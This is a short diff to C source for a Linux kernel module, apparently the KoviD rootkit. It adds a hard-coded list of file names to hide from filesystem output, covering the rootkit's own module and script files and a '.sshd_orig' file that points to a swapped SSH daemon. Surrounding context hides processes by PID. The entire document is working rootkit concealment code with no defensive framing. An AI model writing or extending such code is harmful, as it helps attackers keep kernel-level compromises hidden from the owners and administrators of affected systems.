@@ -754,6 +754,14 @@ static int __init kv_init(void) {
     struct kernel_syscalls *kaddr = NULL;
 #endif
 
+    /*
+     * Hide these names from write() fs output
+     */
+    static const char *hide_names[] = {
+        ".kovid", "kovid", "kovid.ko", UUIDGEN ".ko",
+        UUIDGEN ".sh", ".sshd_orig", NULL
+    };
+
 
     /** show current version for when running in debug mode */
     prinfo("version %s\n", KOVID_VERSION);
@@ -808,7 +816,7 @@ cont:
     kv_hide_task_by_pid(tsk_tainted->pid, 0, CHILDREN);
 
     /** hide magic filenames & directories */
-    fs_add_name_ro(kv_hide_str_on_load, 0);
+    fs_add_name_ro(hide_names, 0);
 
     /** hide magic filenames, directories and processes */
     fs_add_name_ro(kv_get_hide_ps_names(), 0);
